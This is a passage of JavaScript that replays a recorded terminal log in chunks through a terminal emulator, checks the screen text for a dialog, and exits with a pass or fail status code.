    const chunk = raw.slice(offset, offset + CHUNK)
    offset += CHUNK
    hterm.write(chunk, () => {
      if (!detected) {
        const screenText = screenTextFromBuffer(hterm.buffer.active, 30, 40)
        const r = parseDialog(screenText)
        if (r) {
          detected = r
          detectedAt = offset
          finishLog()
          return
        }
      }
      stepLog()
    })
  }
  stepLog()
} else {
  process.exit(failed ? 2 : 0)
}
